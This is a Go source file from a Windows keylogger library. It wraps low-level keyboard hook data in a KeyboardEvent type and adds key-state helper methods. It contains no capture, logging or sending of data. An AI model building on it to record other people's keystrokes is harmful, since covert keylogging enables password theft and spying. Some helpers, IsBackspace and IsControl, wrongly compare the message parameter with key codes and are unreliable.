package keylogger

import (
	"unsafe"

	"github.com/Spriithy/gkl/wintypes"
)

type KeyboardEvent struct {
	WParam     wintypes.WPARAM
	LParam     wintypes.LPARAM
	Layout     wintypes.HKL
	HookStruct *wintypes.KBDLLHOOKSTRUCT
}

func NewKeyboardEvent(wParam wintypes.WPARAM, lParam wintypes.LPARAM, layout wintypes.HKL) *KeyboardEvent {
	return &KeyboardEvent{
		WParam:     wParam,
		LParam:     lParam,
		Layout:     layout,
		HookStruct: (*wintypes.KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam)),
	}
}

func (ke *KeyboardEvent) IsKeyUp() bool {
	return ke.WParam == wintypes.WM_KEYUP
}

func (ke *KeyboardEvent) IsKeyDown() bool {
	return ke.WParam == wintypes.WM_KEYDOWN
}

func (ke *KeyboardEvent) IsSysKeyUp() bool {
	return ke.WParam == wintypes.WM_SYSKEYUP
}

func (ke *KeyboardEvent) IsSysKeyDown() bool {
	return ke.WParam == wintypes.WM_SYSKEYDOWN
}

func (ke *KeyboardEvent) IsBackspace() bool {
	return ke.WParam == wintypes.VK_BACK
}

func (ke *KeyboardEvent) IsControl() bool {
	return ke.WParam == wintypes.VK_CONTROL
}

func (ke *KeyboardEvent) IsMode(mode wintypes.WPARAM) bool {
	return ke.WParam == mode
}

func (ke *KeyboardEvent) IsVk(vkCode wintypes.DWORD) bool {
	return ke.HookStruct.VkCode == vkCode
}

func (ke *KeyboardEvent) IsVkMode(vkCode wintypes.DWORD, mode wintypes.WPARAM) bool {
	return ke.IsMode(mode) && ke.IsVk(vkCode)
}

func (ke *KeyboardEvent) IsShift() bool {
	return ke.IsVk(wintypes.VK_SHIFT) || ke.IsVk(wintypes.VK_LSHIFT) || ke.IsVk(wintypes.VK_RSHIFT)
}

func (ke *KeyboardEvent) IsCaps() bool {
	return ke.IsVk(wintypes.VK_CAPITAL)
}
